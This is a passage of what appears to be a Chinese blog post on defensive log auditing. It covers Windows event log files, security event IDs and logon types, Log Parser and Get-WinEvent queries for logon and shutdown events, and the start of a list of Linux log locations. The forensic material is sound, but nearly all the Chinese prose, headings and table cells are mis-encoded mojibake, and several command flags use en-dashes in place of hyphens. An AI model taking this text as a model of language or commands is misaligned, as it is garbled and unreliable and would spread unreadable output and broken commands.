        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†æ—¥å¿—å®¡è®¡çš„ç›¸å…³å†…å®¹ï¼</p><a id="more"></a><h2 id="ç³»ç»Ÿæ—¥å¿—"><a href="#ç³»ç»Ÿæ—¥å¿—" class="headerlink" title="ç³»ç»Ÿæ—¥å¿—"></a>ç³»ç»Ÿæ—¥å¿—</h2><h3 id="windowsæ—¥å¿—åˆ†æ"><a href="#windowsæ—¥å¿—åˆ†æ" class="headerlink" title="windowsæ—¥å¿—åˆ†æ"></a>windowsæ—¥å¿—åˆ†æ</h3><p>æ—¥å¿—è®°å½•äº†ç³»ç»Ÿä¸­ç¡¬ä»¶ã€è½¯ä»¶å’Œç³»ç»Ÿé—®é¢˜çš„ä¿¡æ¯ï¼ŒåŒæ—¶è¿˜ç›‘è§†ç€ç³»ç»Ÿä¸­å‘ç”Ÿçš„äº‹ä»¶ã€‚å½“æœåŠ¡å™¨è¢«å…¥ä¾µæˆ–è€…ç³»ç»Ÿï¼ˆåº”ç”¨ï¼‰å‡ºç°é—®é¢˜æ—¶ï¼Œç®¡ç†å‘˜å¯ä»¥æ ¹æ®æ—¥å¿—è¿…é€Ÿå®šä½é—®é¢˜çš„å…³é”®ï¼Œå†å¿«é€Ÿå¤„ç†é—®é¢˜ï¼Œä»è€Œæå¤§åœ°æé«˜å·¥ä½œæ•ˆç‡å’ŒæœåŠ¡å™¨çš„å®‰å…¨æ€§ã€‚<br>Windows é€šè¿‡è‡ªå¸¦äº‹ä»¶æŸ¥çœ‹å™¨ç®¡ç†æ—¥å¿—ï¼Œä½¿ç”¨å‘½ä»¤<code>eventvwr.msc</code>æˆ–<code>eventvwr</code>æ‰“å¼€</p><img src="/2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/TIMæˆªå›¾20200218215545.png" style="zoom:80%;"><h4 id="Windows-æ—¥å¿—ä½ç½®"><a href="#Windows-æ—¥å¿—ä½ç½®" class="headerlink" title="Windows æ—¥å¿—ä½ç½®"></a>Windows æ—¥å¿—ä½ç½®</h4><p><code>Windows 2000/Server2003/Windows XP</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\%SystemRoot%\System32\Config\*.evt</span><br></pre></td></tr></table></figure><p><code>Windows Vista/7/10/Server2008/Sever2016:</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\%SystemRoot%\System32\winevt\Logs\*.evtx</span><br></pre></td></tr></table></figure><p><code>%SystemRoot%</code>ä¸ºç³»ç»Ÿç¯å¢ƒå˜é‡ï¼Œé»˜è®¤å€¼ä¸º<code>C:\WINDOWS</code></p><p><strong>å‡ ä¸ªé‡è¦çš„äº‹ä»¶æ—¥å¿—æ–‡ä»¶è¯´æ˜ï¼ˆVista/Win7/Win8/Win10/Server2008/Server 2012åŠä¹‹åçš„ç‰ˆæœ¬)ï¼š</strong></p><table><thead><tr><th align="center">äº‹ä»¶ç±»å‹</th><th align="left">æè¿°</th><th align="center">æ–‡ä»¶å</th></tr></thead><tbody><tr><td align="center">ç³»ç»Ÿ</td><td align="left">åŒ…å«ç³»ç»Ÿè¿›ç¨‹ï¼Œè®¾å¤‡ç£ç›˜æ´»åŠ¨ç­‰ã€‚äº‹ä»¶è®°å½•äº†è®¾å¤‡é©±åŠ¨æ— æ³•æ­£å¸¸å¯åŠ¨æˆ–åœæ­¢ï¼Œç¡¬ä»¶å¤±è´¥ï¼Œé‡å¤IPåœ°å€ï¼Œç³»ç»Ÿè¿›ç¨‹çš„å¯åŠ¨ï¼Œåœæ­¢åŠæš‚åœç­‰è¡Œä¸ºã€‚</td><td align="center">System.evtx</td></tr><tr><td align="center">å®‰å…¨</td><td align="left">åŒ…å«å®‰å…¨æ€§ç›¸å…³çš„äº‹ä»¶ï¼Œå¦‚ç”¨æˆ·æƒé™å˜æ›´ï¼Œç™»å½•åŠæ³¨é”€ï¼Œæ–‡ä»¶åŠæ–‡ä»¶å¤¹è®¿é—®ï¼Œæ‰“å°ç­‰ä¿¡æ¯ã€‚</td><td align="center">Security.evtx</td></tr><tr><td align="center">åº”ç”¨ç¨‹åº</td><td align="left">åŒ…å«æ“ä½œç³»ç»Ÿå®‰è£…çš„åº”ç”¨ç¨‹åºè½¯ä»¶ç›¸å…³çš„äº‹ä»¶ã€‚äº‹ä»¶åŒ…æ‹¬äº†é”™è¯¯ã€è­¦å‘ŠåŠä»»ä½•åº”ç”¨ç¨‹åºéœ€è¦æŠ¥å‘Šçš„ä¿¡æ¯ï¼Œåº”ç”¨ç¨‹åºå¼€å‘äººå‘˜å¯ä»¥å†³å®šè®°å½•å“ªäº›ä¿¡æ¯ã€‚</td><td align="center">Application.evtx</td></tr><tr><td align="center">Microsoft</td><td align="left">Microsoftæ–‡ä»¶å¤¹ä¸‹åŒ…å«äº†200å¤šä¸ªå¾®è½¯å†…ç½®çš„äº‹ä»¶æ—¥å¿—åˆ†ç±»ï¼Œåªæœ‰éƒ¨åˆ†ç±»å‹é»˜è®¤å¯ç”¨è®°å½•åŠŸèƒ½ï¼Œå¦‚è¿œç¨‹æ¡Œé¢å®¢æˆ·ç«¯è¿æ¥ã€æ— çº¿ç½‘ç»œã€æœ‰çº¿ç½‘è·¯ã€è®¾å¤‡å®‰è£…ç­‰ç›¸å…³æ—¥å¿—ã€‚</td><td align="center">è¯¦è§æ—¥å¿—å­˜å‚¨ç›®å½•å¯¹åº”æ–‡ä»¶</td></tr><tr><td align="center">Microsoft Office Alerts</td><td align="left">å¾®è½¯Officeåº”ç”¨ç¨‹åºï¼ˆåŒ…æ‹¬Word/Excel/PowerPointç­‰ï¼‰çš„å„ç§è­¦å‘Šä¿¡æ¯ï¼Œå…¶ä¸­åŒ…å«ç”¨æˆ·å¯¹æ–‡æ¡£æ“ä½œè¿‡ç¨‹ä¸­å‡ºç°çš„å„ç§è¡Œä¸ºï¼Œè®°å½•æœ‰æ–‡ä»¶åã€è·¯å¾„ç­‰ä¿¡æ¯ã€‚</td><td align="center">OAerts.evtx</td></tr><tr><td align="center">Windows PowerShell</td><td align="left">Windowsè‡ªå¸¦çš„PowerShellåº”ç”¨çš„æ—¥å¿—ä¿¡æ¯ã€‚</td><td align="center">Windows PowerShell.evtx</td></tr><tr><td align="center">Internet Explorer</td><td align="left">IEæµè§ˆå™¨åº”ç”¨ç¨‹åºçš„æ—¥å¿—ä¿¡æ¯ï¼Œé»˜è®¤æœªå¯ç”¨ï¼Œéœ€è¦é€šè¿‡ç»„ç­–ç•¥è¿›è¡Œé…ç½®ã€‚</td><td align="center">Internet Explorer.evtx</td></tr></tbody></table><h4 id="äº‹ä»¶ç±»å‹"><a href="#äº‹ä»¶ç±»å‹" class="headerlink" title="äº‹ä»¶ç±»å‹"></a>äº‹ä»¶ç±»å‹</h4><p>Windowsäº‹ä»¶æ—¥å¿—ä¸­å…±æœ‰äº”ç§äº‹ä»¶ç±»å‹ï¼Œæ‰€æœ‰çš„äº‹ä»¶å¿…é¡»æ‹¥æœ‰äº”ç§äº‹ä»¶ç±»å‹ä¸­çš„ä¸€ç§ï¼Œä¸”åªå¯ä»¥æœ‰ä¸€ç§ã€‚äº”ç§äº‹ä»¶ç±»å‹åˆ†ä¸ºï¼š</p><ol><li><p>**ä¿¡æ¯(Information)**ï¼šä¿¡æ¯äº‹ä»¶æŒ‡åº”ç”¨ç¨‹åºã€é©±åŠ¨ç¨‹åºæˆ–æœåŠ¡çš„æˆåŠŸæ“ä½œçš„äº‹ä»¶ã€‚</p></li><li><p><strong>è­¦å‘Š(Warning)ï¼š</strong>è­¦å‘Šäº‹ä»¶æŒ‡ä¸æ˜¯ç›´æ¥çš„ã€ä¸»è¦çš„ï¼Œä½†æ˜¯ä¼šå¯¼è‡´å°†æ¥é—®é¢˜å‘ç”Ÿçš„é—®é¢˜ã€‚ä¾‹å¦‚ï¼Œå½“ç£ç›˜ç©ºé—´ä¸è¶³æˆ–æœªæ‰¾åˆ°æ‰“å°æœºæ—¶ï¼Œéƒ½ä¼šè®°å½•ä¸€ä¸ªâ€œè­¦å‘Šâ€äº‹ä»¶ã€‚</p></li><li><p><strong>é”™è¯¯(Error)ï¼š</strong>é”™è¯¯äº‹ä»¶æŒ‡ç”¨æˆ·åº”è¯¥çŸ¥é“çš„é‡è¦çš„é—®é¢˜ã€‚é”™è¯¯äº‹ä»¶é€šå¸¸æŒ‡åŠŸèƒ½å’Œæ•°æ®çš„ä¸¢å¤±ã€‚ä¾‹å¦‚,å¦‚æœä¸€ä¸ªæœåŠ¡ä¸èƒ½ä½œä¸ºç³»ç»Ÿå¼•å¯¼è¢«åŠ è½½ï¼Œé‚£ä¹ˆå®ƒä¼šäº§ç”Ÿä¸€ä¸ªé”™è¯¯äº‹ä»¶ã€‚</p></li><li><p><strong>æˆåŠŸå®¡æ ¸(Success audit)ï¼š</strong>æˆåŠŸçš„å®¡æ ¸å®‰å…¨è®¿é—®å°è¯•ï¼Œä¸»è¦æ˜¯æŒ‡å®‰å…¨æ€§æ—¥å¿—ï¼Œè¿™é‡Œè®°å½•ç€ç”¨æˆ·ç™»å½•/æ³¨é”€ã€å¯¹è±¡è®¿é—®ã€ç‰¹æƒä½¿ç”¨ã€è´¦æˆ·ç®¡ç†ã€ç­–ç•¥æ›´æ”¹ã€è¯¦ç»†è·Ÿè¸ªã€ç›®å½•æœåŠ¡è®¿é—®ã€è´¦æˆ·ç™»å½•ç­‰äº‹ä»¶ï¼Œä¾‹å¦‚æ‰€æœ‰çš„æˆåŠŸç™»å½•ç³»ç»Ÿéƒ½ä¼šè¢«è®°å½•ä¸ºâ€œ æˆåŠŸå®¡æ ¸â€äº‹ä»¶ã€‚</p></li><li><p><strong>å¤±è´¥å®¡æ ¸(Failure audit)ï¼š</strong>å¤±è´¥çš„å®¡æ ¸å®‰å…¨ç™»å½•å°è¯•ï¼Œä¾‹å¦‚ç”¨æˆ·è¯•å›¾è®¿é—®ç½‘ç»œé©±åŠ¨å™¨å¤±è´¥ï¼Œåˆ™è¯¥å°è¯•ä¼šè¢«ä½œä¸ºå¤±è´¥å®¡æ ¸äº‹ä»¶è®°å½•ä¸‹æ¥ã€‚</p></li></ol><h4 id="é‡è¦äº‹ä»¶ID"><a href="#é‡è¦äº‹ä»¶ID" class="headerlink" title="é‡è¦äº‹ä»¶ID"></a>é‡è¦äº‹ä»¶ID</h4><p>Windowsäº‹ä»¶æ—¥å¿—ä¸­è®°å½•çš„ä¿¡æ¯ä¸­ï¼Œå…³é”®çš„è¦ç´ åŒ…å«äº‹ä»¶çº§åˆ«ã€è®°å½•æ—¶é—´ã€äº‹ä»¶æ¥æºã€äº‹ä»¶IDã€äº‹ä»¶æè¿°ã€æ¶‰åŠçš„ç”¨æˆ·ã€è®¡ç®—æœºã€æ“ä½œä»£ç åŠä»»åŠ¡ç±»åˆ«ç­‰ã€‚å…¶ä¸­äº‹ä»¶çš„IDä¸æ“ä½œç³»ç»Ÿçš„ç‰ˆæœ¬æœ‰å…³ï¼Œä»¥ä¸‹åˆ—ä¸¾å‡ºçš„äº‹ä»¶IDçš„æ“çºµç³»ç»Ÿä¸ºVista/Win7/Win8/Win10/Server2008/Server 2012åŠä¹‹åçš„ç‰ˆæœ¬ï¼š</p><table><thead><tr><th align="center">äº‹ä»¶ID</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">1102</td><td align="center">æ¸…ç†å®¡è®¡æ—¥å¿—</td></tr><tr><td align="center">4624</td><td align="center">è´¦å·æˆåŠŸç™»å½•</td></tr><tr><td align="center">4625</td><td align="center">è´¦å·ç™»å½•å¤±è´¥</td></tr><tr><td align="center">4768</td><td align="center">Kerberosèº«ä»½éªŒè¯ï¼ˆTGTè¯·æ±‚ï¼‰</td></tr><tr><td align="center">4769</td><td align="center">KerberosæœåŠ¡ç¥¨è¯è¯·æ±‚</td></tr><tr><td align="center">4776</td><td align="center">NTLMèº«ä»½éªŒè¯</td></tr><tr><td align="center">4672</td><td align="center">æˆäºˆç‰¹æ®Šæƒé™</td></tr><tr><td align="center">4720</td><td align="center">åˆ›å»ºç”¨æˆ·</td></tr><tr><td align="center">4726</td><td align="center">åˆ é™¤ç”¨æˆ·</td></tr><tr><td align="center">4728</td><td align="center">å°†æˆå‘˜æ·»åŠ åˆ°å¯ç”¨å®‰å…¨çš„å…¨å±€ç»„ä¸­</td></tr><tr><td align="center">4729</td><td align="center">å°†æˆå‘˜ä»å®‰å…¨çš„å…¨å±€ç»„ä¸­ç§»é™¤</td></tr><tr><td align="center">4732</td><td align="center">å°†æˆå‘˜æ·»åŠ åˆ°å¯ç”¨å®‰å…¨çš„æœ¬åœ°ç»„ä¸­</td></tr><tr><td align="center">4733</td><td align="center">å°†æˆå‘˜ä»å¯ç”¨å®‰å…¨çš„æœ¬åœ°ç»„ä¸­ç§»é™¤</td></tr><tr><td align="center">4756</td><td align="center">å°†æˆå‘˜æ·»åŠ åˆ°å¯ç”¨å®‰å…¨çš„é€šç”¨ç»„ä¸­</td></tr><tr><td align="center">4757</td><td align="center">å°†æˆå‘˜ä»å¯ç”¨å®‰å…¨çš„é€šç”¨ç»„ä¸­ç§»é™¤</td></tr><tr><td align="center">4719</td><td align="center">ç³»ç»Ÿå®¡è®¡ç­–ç•¥ä¿®æ”¹</td></tr></tbody></table><p>äº”ç§äº‹ä»¶ç±»å‹ä¸­ï¼Œæœ€ä¸ºé‡è¦çš„æ˜¯æˆåŠŸå®¡æ ¸ï¼ˆSuccess Auditï¼‰ï¼Œæ‰€æœ‰ç³»ç»Ÿç™»å½•æˆåŠŸéƒ½ä¼šè¢«æ ‡è®°æˆä¸ºæˆåŠŸå®¡æ ¸ã€‚æ¯ä¸ªæˆåŠŸç™»å½•çš„äº‹ä»¶éƒ½ä¼šæ ‡è®°ä¸€ä¸ªç™»å½•ç±»å‹ï¼š</p><table><thead><tr><th align="center">ç™»å½•ç±»å‹</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">2</td><td align="center">äº¤äº’å¼ç™»å½•ï¼ˆç”¨æˆ·ä»æ§åˆ¶å°ç™»å½•ï¼‰</td></tr><tr><td align="center">3</td><td align="center">ç½‘ç»œï¼ˆä¾‹å¦‚ï¼šé€šè¿‡net use,è®¿é—®å…±äº«ç½‘ç»œï¼‰</td></tr><tr><td align="center">4</td><td align="center">æ‰¹å¤„ç†ï¼ˆä¸ºæ‰¹å¤„ç†ç¨‹åºä¿ç•™ï¼‰</td></tr><tr><td align="center">5</td><td align="center">æœåŠ¡å¯åŠ¨ï¼ˆæœåŠ¡ç™»å½•ï¼‰</td></tr><tr><td align="center">6</td><td align="center">ä¸æ”¯æŒ</td></tr><tr><td align="center">7</td><td align="center">è§£é”ï¼ˆå¸¦å¯†ç ä¿æŠ¤çš„å±å¹•ä¿æŠ¤ç¨‹åºçš„æ— äººå€¼ç­å·¥ä½œç«™ï¼‰</td></tr><tr><td align="center">8</td><td align="center">ç½‘ç»œæ˜æ–‡ï¼ˆIISæœåŠ¡å™¨ç™»å½•éªŒè¯ï¼‰</td></tr><tr><td align="center">10</td><td align="center">è¿œç¨‹äº¤äº’ï¼ˆç»ˆç«¯æœåŠ¡ï¼Œè¿œç¨‹æ¡Œé¢ï¼Œè¿œç¨‹è¾…åŠ©ï¼‰</td></tr><tr><td align="center">11</td><td align="center">ç¼“å­˜åŸŸè¯ä¹¦ç™»å½•</td></tr></tbody></table><p><strong>è¿œç¨‹è¿æ¥æ—¥å¿—</strong>ï¼ˆ<code>åº”ç”¨ç¨‹åºå’ŒæœåŠ¡æ—¥å¿—</code>-&gt;<code>Microsoft</code>-&gt;<code>Windows</code>-&gt;-<code>TerminalServices-RemoteConnectionManager</code>-&gt;<code>Operational</code>ï¼‰ï¼Œé‡è¦äº‹ä»¶ ID å’Œå«ä¹‰ï¼š</p><ul><li>1149ï¼šç”¨æˆ·è®¤è¯æˆåŠŸ</li><li>21ï¼šè¿œç¨‹æ¡Œé¢æœåŠ¡ï¼šä¼šè¯ç™»å½•æˆåŠŸ</li><li>24ï¼šè¿œç¨‹æ¡Œé¢æœåŠ¡ï¼šä¼šè¯å·²æ–­å¼€è¿æ¥</li><li>25ï¼šè¿œç¨‹æ¡Œé¢æœåŠ¡ï¼šä¼šè¯é‡æ–°è¿æ¥æˆåŠŸ</li></ul><p><strong>è®¡åˆ’ä»»åŠ¡äº‹ä»¶æ—¥å¿—</strong>(<code>åº”ç”¨ç¨‹åºå’ŒæœåŠ¡æ—¥å¿—</code>-&gt;<code>Microsoft</code>-&gt;<code>Windows</code>-&gt;<code>TaskScheduler</code>-&gt;<code>Operational</code>)ï¼Œè®¡åˆ’ä»»åŠ¡ ID å«ä¹‰ï¼š</p><ul><li>100ï¼šä»»åŠ¡å·²å¼€å§‹</li><li>102ï¼šä»»åŠ¡å®Œæˆ</li><li>106ï¼šå·²æ³¨å†Œä»»åŠ¡ï¼ˆå…³æ³¨ç‚¹ï¼‰</li><li>107ï¼šåœ¨è°ƒåº¦ç¨‹åºä¸Šè§¦å‘ä»»åŠ¡</li><li>110ï¼šç”¨æˆ·è§¦å‘çš„ä»»åŠ¡</li><li>129ï¼šåˆ›å»ºä»»åŠ¡æµç¨‹ï¼ˆæ¨å‡ºï¼‰</li><li>140ï¼šä»»åŠ¡å·²æ›´æ–°</li><li>141ï¼šä»»åŠ¡å·²åˆ é™¤</li><li>200ï¼šè¿è¡Œè®¡åˆ’ä»»åŠ¡</li><li>325ï¼šå¯åŠ¨è¯·æ±‚æ’é˜Ÿ</li></ul><p>æ›´å¤šè¯¦ç»†äº‹ä»¶idè¯´æ˜å‚è§å¾®è½¯å®˜æ–¹ï¼š<a href="https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008">https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008</a></p><h4 id="å·¥å…·åˆ†ææ—¥å¿—"><a href="#å·¥å…·åˆ†ææ—¥å¿—" class="headerlink" title="å·¥å…·åˆ†ææ—¥å¿—"></a>å·¥å…·åˆ†ææ—¥å¿—</h4><h5 id="Log-Parser"><a href="#Log-Parser" class="headerlink" title="Log Parser"></a>Log Parser</h5><p>Log Parserï¼ˆæ˜¯å¾®è½¯å…¬å¸å‡ºå“çš„æ—¥å¿—åˆ†æå·¥å…·ï¼Œå®ƒåŠŸèƒ½å¼ºå¤§ï¼Œä½¿ç”¨ç®€å•ï¼Œå¯ä»¥åˆ†æåŸºäºæ–‡æœ¬çš„æ—¥å¿—æ–‡ä»¶ã€XML æ–‡ä»¶ã€CSVï¼ˆé€—å·åˆ†éš”ç¬¦ï¼‰æ–‡ä»¶ï¼Œä»¥åŠæ“ä½œç³»ç»Ÿçš„äº‹ä»¶æ—¥å¿—ã€æ³¨å†Œè¡¨ã€æ–‡ä»¶ç³»ç»Ÿã€Active Directoryã€‚å®ƒå¯ä»¥åƒä½¿ç”¨ SQL è¯­å¥ä¸€æ ·æŸ¥è¯¢åˆ†æè¿™äº›æ•°æ®ï¼Œç”šè‡³å¯ä»¥æŠŠåˆ†æç»“æœä»¥å„ç§å›¾è¡¨çš„å½¢å¼å±•ç°å‡ºæ¥ã€‚</p><p>Log Parser 2.2ä¸‹è½½åœ°å€ï¼š<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a></p><p>é»˜è®¤ä¼šå®‰è£…åˆ°<code>C:\Program Files (x86)\Log Parser 2.2</code>ç›®å½•ä¸‹</p><p><strong>åŸºæœ¬æŸ¥è¯¢ç»“æ„</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Logparser.exe â€“i:EVT â€“o:DATAGRID &quot;SELECT * FROM c:xx.evtx&quot;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨Log Parseråˆ†ææ—¥å¿—</p><p>1ã€æŸ¥è¯¢ç™»å½•æˆåŠŸçš„äº‹ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ç™»å½•æˆåŠŸçš„æ‰€æœ‰äº‹ä»¶</span><br><span class="line">LogParser.exe -i:EVT â€“o:DATAGRID  &quot;SELECT *  FROM c:Security.evtx where EventID&#x3D;4624&quot;</span><br><span class="line"></span><br><span class="line">æŒ‡å®šç™»å½•æ—¶é—´èŒƒå›´çš„äº‹ä»¶ï¼š</span><br><span class="line">LogParser.exe -i:EVT â€“o:DATAGRID  &quot;SELECT *  FROM c:Security.evtx where TimeGenerated&gt;&#39;2020-02-19 23:32:11&#39; and TimeGenerated&lt;&#39;2020-02-20 01:00:00&#39; and EventID&#x3D;4624&quot;</span><br><span class="line"></span><br><span class="line">æå–ç™»å½•æˆåŠŸçš„ç”¨æˆ·åå’ŒIPï¼š</span><br><span class="line">LogParser.exe -i:EVT  â€“o:DATAGRID  &quot;SELECT EXTRACT_TOKEN(Message,13,&#39; &#39;) as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#39;|&#39;) as Username,EXTRACT_TOKEN(Message,38,&#39; &#39;) as Loginip FROM c:Security.evtx where EventID&#x3D;4624&quot;</span><br></pre></td></tr></table></figure><p>2ã€æŸ¥è¯¢ç™»å½•å¤±è´¥çš„äº‹ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ç™»å½•å¤±è´¥çš„æ‰€æœ‰äº‹ä»¶ï¼š</span><br><span class="line">LogParser.exe -i:EVT â€“o:DATAGRID  &quot;SELECT *  FROM c:Security.evtx where EventID&#x3D;4625&quot;</span><br><span class="line"></span><br><span class="line">æå–ç™»å½•å¤±è´¥ç”¨æˆ·åè¿›è¡Œèšåˆç»Ÿè®¡ï¼š</span><br><span class="line">LogParser.exe  -i:EVT &quot;SELECT  EXTRACT_TOKEN(Message,13,&#39; &#39;)  as EventType,EXTRACT_TOKEN(Message,19,&#39; &#39;) as user,count(EXTRACT_TOKEN(Message,19,&#39; &#39;)) as Times,EXTRACT_TOKEN(Message,39,&#39; &#39;) as Loginip FROM c:Security.evtx where EventID&#x3D;4625 GROUP BY Message&quot;</span><br></pre></td></tr></table></figure><p>3ã€ç³»ç»Ÿå†å²å¼€å…³æœºè®°å½•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT â€“o:DATAGRID  &quot;SELECT TimeGenerated,EventID,Message FROM c:System.evtx where EventID&#x3D;6005 or EventID&#x3D;6006&quot;</span><br></pre></td></tr></table></figure><h5 id="Get-WinEvent"><a href="#Get-WinEvent" class="headerlink" title="Get-WinEvent"></a>Get-WinEvent</h5><p>æ˜¯ä¸€ä¸ªä»æœ¬åœ°å’Œè¿œç¨‹è®¡ç®—æœºä¸Šçš„<strong>äº‹ä»¶æ—¥å¿—</strong>å’Œ<strong>äº‹ä»¶è·Ÿè¸ªæ—¥å¿—</strong>æ–‡ä»¶ä¸­è·å–äº‹ä»¶çš„å·¥å…·</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Get-WinEventå¸®åŠ©å‘½ä»¤</span></span><br><span class="line"><span class="built_in">get-help</span> <span class="built_in">Get-WinEvent</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ—å‡ºæ‰€æœ‰äº‹ä»¶æ—¥å¿—</span></span><br><span class="line"><span class="built_in">Get-WinEvent</span> <span class="literal">-ListLog</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># powershellç®¡ç†å‘˜æƒé™ä¸‹è·å–å®‰å…¨äº‹ä»¶æ—¥å¿—</span></span><br><span class="line"><span class="built_in">Get-WinEvent</span> <span class="literal">-FilterHashtable</span> <span class="selector-tag">@</span>&#123;LogName=<span class="string">&#x27;Security&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿‡æ»¤å®‰å…¨äº‹ä»¶ID 4624</span></span><br><span class="line"><span class="built_in">Get-WinEvent</span> <span class="literal">-FilterHashtable</span> <span class="selector-tag">@</span>&#123;LogName=<span class="string">&#x27;Security&#x27;</span>;ID=<span class="string">&#x27;4624&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥è¯¢ä»Šå¤©çš„åº”ç”¨å’Œç³»ç»Ÿæ—¥å¿—ï¼Œæ˜¾ç¤ºå‰2æ¡</span></span><br><span class="line"><span class="built_in">Get-WinEvent</span> <span class="selector-tag">@</span>&#123;logname=<span class="string">&#x27;application&#x27;</span>,<span class="string">&#x27;system&#x27;</span>;starttime=[<span class="built_in">datetime</span>]::today &#125; <span class="literal">-MaxEvents</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ¹æ®IDæŸ¥è¯¢äº‹ä»¶</span></span><br><span class="line"><span class="built_in">Get-WinEvent</span> <span class="literal">-LogName</span> Microsoft<span class="literal">-Windows</span><span class="literal">-PowerShell</span>/Operational | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.ID <span class="operator">-eq</span> <span class="string">&quot;4100&quot;</span> <span class="operator">-or</span> <span class="variable">$_</span>.ID <span class="operator">-eq</span> <span class="string">&quot;4104&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥è¯¢æŒ‡å®šæ—¶é—´å†…çš„äº‹ä»¶</span></span><br><span class="line"><span class="variable">$StartTime</span>=<span class="built_in">Get-Date</span>  <span class="literal">-Year</span>  <span class="number">2020</span>  <span class="literal">-Month</span>  <span class="number">2</span>  <span class="literal">-Day</span>  <span class="number">18</span>  <span class="literal">-Hour</span>  <span class="number">23</span>  <span class="literal">-Minute</span>  <span class="number">30</span></span><br><span class="line"><span class="variable">$EndTime</span>=<span class="built_in">Get-Date</span>  <span class="literal">-Year</span>  <span class="number">2020</span>  <span class="literal">-Month</span>  <span class="number">2</span>  <span class="literal">-Day</span>  <span class="number">19</span>  <span class="literal">-Hour</span>  <span class="number">0</span>  <span class="literal">-Minute</span>  <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-WinEvent</span> <span class="literal">-FilterHashtable</span> <span class="selector-tag">@</span>&#123;LogName=<span class="string">&#x27;System&#x27;</span>;StartTime=<span class="variable">$StartTime</span>;EndTime=<span class="variable">$EndTime</span>&#125;</span><br></pre></td></tr></table></figure><img src="/2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/TIMæˆªå›¾20200219001249.png" style="zoom: 80%;"><p>è¯¦ç»†ä½¿ç”¨å¯ä»¥å‚è€ƒï¼š<a href="https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Diagnostics/Get-WinEvent?view=powershell-5.1">https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Diagnostics/Get-WinEvent?view=powershell-5.1</a></p><h3 id="Linuxæ—¥å¿—åˆ†æ"><a href="#Linuxæ—¥å¿—åˆ†æ" class="headerlink" title="Linuxæ—¥å¿—åˆ†æ"></a>Linuxæ—¥å¿—åˆ†æ</h3><h4 id="Linuxæ—¥å¿—ä½ç½®"><a href="#Linuxæ—¥å¿—ä½ç½®" class="headerlink" title="Linuxæ—¥å¿—ä½ç½®"></a>Linuxæ—¥å¿—ä½ç½®</h4><p>æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š<code>/var/log/*</code></p><p><strong>å¸¸è§çš„æ—¥å¿—æ–‡ä»¶ï¼š</strong></p><table><thead><tr><th align="center">è·¯å¾„</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">/var/log/messages</td><td align="center">è®°å½• Linux å†…æ ¸æ¶ˆæ¯åŠå„ç§åº”ç”¨ç¨‹åºçš„å…¬å…±æ—¥å¿—ä¿¡æ¯</td></tr><tr><td align="center">/var/log/cron</td><td align="center">è®°å½• crond è®¡åˆ’ä»»åŠ¡äº§ç”Ÿçš„äº‹ä»¶ä¿¡æ¯</td></tr><tr><td align="center">/var/log/dmesg</td><td align="center">è®°å½• Linux æ“ä½œç³»ç»Ÿåœ¨å¼•å¯¼è¿‡ç¨‹ä¸­çš„å„ç§äº‹ä»¶ä¿¡æ¯</td></tr><tr><td align="center">/var/log/maillog</td><td align="center">è®°å½•è¿›å…¥æˆ–å‘å‡ºç³»ç»Ÿçš„ç”µå­é‚®ä»¶æ´»åŠ¨</td></tr><tr><td align="center">/var/log/lastlog</td><td align="center">è®°å½•æ¯ä¸ªç”¨æˆ·æœ€è¿‘çš„ç™»å½•äº‹ä»¶</td></tr><tr><td align="center">/var/log/secure</td><td 